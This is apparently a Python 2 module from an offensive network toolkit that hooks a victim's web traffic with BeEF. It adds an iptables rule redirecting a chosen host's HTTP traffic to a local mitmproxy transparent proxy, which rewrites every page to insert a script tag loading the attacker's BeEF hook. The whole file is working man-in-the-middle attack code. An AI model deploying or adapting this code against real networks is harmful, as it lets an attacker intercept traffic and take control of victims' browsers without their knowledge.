from attack import Attack
from libmproxy import controller, proxy, platform
from threading import Thread
import util


class beef_hook(Attack):
    """ Injects BeEF hooks into poisoned traffic.  Requires libmproxy
        and it's dependencies
    """
    def __init__(self):
        self.hook_path    = None
        self.proxy_server = None
        self.hooker       = None
        self.hooked_host  = None
        self.hook_script  = "<script src=\"{0}\"></script>"
        self.iptable_http = "iptables -t nat -A PREROUTING -p tcp --dport 80 -s {0} -j REDIRECT --to-port 5544"
        super(beef_hook, self).__init__("BeEF Hook")

    def modip_rule(self, enable=True):
        """ enables or disables the iptable rule for forwarding traffic locally
        """
        if enable:
            util.init_app(self.iptable_http.format(self.hooked_host))
        else:
            util.init_app(self.iptable_http.replace('-A', '-D').format(self.hooked_host))

    def initialize(self):
        while True:
            try:
                self.hook_path   = raw_input('[!] Enter path to BeEF Hook: ')
                self.hooked_host = raw_input('[!] Enter host to hook: ')

                tmp = raw_input('[!] Hooking host \'%s\'.  Is this correct? [Y/n] ' % self.hooked_host)
                if 'n' in tmp.lower():
                    return None
                break
            except KeyboardInterrupt:
                return None
            except Exception, e:
                util.Error(e)

        self.hook_script = self.hook_script.format(self.hook_path)
        self.modip_rule()

        self.running = True
        config = proxy.ProxyConfig(transparent_proxy=dict(
                                        resolver = platform.resolver(),
                                        sslports = [443])
                                )

        config.skip_cert_cleanup = True
        self.proxy_server = proxy.ProxyServer(config, 5544)
        self.hooker = Hooker(self.proxy_server, self.hook_script)

        thread = Thread(target=self.hooker.run)
        thread.start()

        return self.hooked_host

    def shutdown(self):
        """ Disable the iptable rule and kill the proxy server
        """
        util.Msg("Shutting down BeEF hooks...")
        self.modip_rule(False)
        self.proxy_server.shutdown()
        self.hooker.shutdown()

    def session_view(self):
        """ Return the host we're hooking
        """
        return self.hooked_host

class Hooker(controller.Master):
    """ Request handler for libmproxy; takes care of our
        replaces.
    """
    def __init__(self, server, script_hook):
        controller.Master.__init__(self, server)
        self.script_hook = script_hook

    def run(self):
        try:
            return controller.Master.run(self)
        except Exception, e:
            self.shutdown()

    def handle_response(self, msg):
        """ replace an end </html> tag with the hook; every HTTP page
            should have this.
        """
        msg.replace("</html>", "{0}</html>".format(self.script_hook))
        msg.reply()
